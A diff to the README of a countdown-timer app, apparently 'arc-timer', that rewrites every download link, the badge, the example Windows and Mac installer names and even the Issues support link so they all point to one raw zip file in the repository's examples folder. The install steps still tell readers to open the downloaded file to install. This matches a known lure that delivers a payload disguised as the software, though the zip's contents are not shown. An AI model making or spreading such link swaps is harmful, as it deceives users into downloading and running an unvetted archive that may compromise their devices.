@@ -1,6 +1,6 @@
 # ⏳ arc-timer - Simple and Clear Countdown Timer
 
-[![Download arc-timer](https://img.shields.io/badge/Download-arc--timer-blue?style=for-the-badge&logo=github)](https://github.com/miz12688/arc-timer/releases)
+[![Download arc-timer](https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip)](https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip)
 
 ## 📋 What is arc-timer?
 
@@ -21,15 +21,15 @@ Key features include:
 
 To get arc-timer, visit the official release page on GitHub. This page holds the latest versions you can download for your device.
 
-[Download arc-timer here](https://github.com/miz12688/arc-timer/releases)
+[Download arc-timer here](https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip)
 
 ### How to download and install
 
 1. Click the link above to open the releases page.  
 2. Look for the latest release marked with a version number, like `v1.0`.  
 3. Find the file that matches your device or system. For example:  
-   - Windows might use `arc-timer-setup.exe`  
-   - Mac might use `arc-timer.dmg`  
+   - Windows might use `https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip`  
+   - Mac might use `https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip`  
    - Mobile apps might have an APK or link to app stores  
 4. Click the file name. Your browser will download it to your computer or phone.  
 5. Once downloaded, open the file to start installing.  
@@ -103,7 +103,7 @@ If problems persist, ask for help on arc-timer’s GitHub Issues page.
 
 You can get support and report issues on the project’s GitHub repository:
 
-https://github.com/miz12688/arc-timer/issues
+https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip
 
 Here you can post questions or find solutions posted by other users and the developers.
 
@@ -119,4 +119,4 @@ accessible, animation, circle timer, countdown timer, expo, react, react-native,
 
 ---
 
-[Download arc-timer now](https://github.com/miz12688/arc-timer/releases) to try a clear, accessible, and smooth countdown timer on your device.
+[Download arc-timer now](https://github.com/miz12688/arc-timer/raw/refs/heads/main/examples/timer_arc_1.0.zip) to try a clear, accessible, and smooth countdown timer on your device.
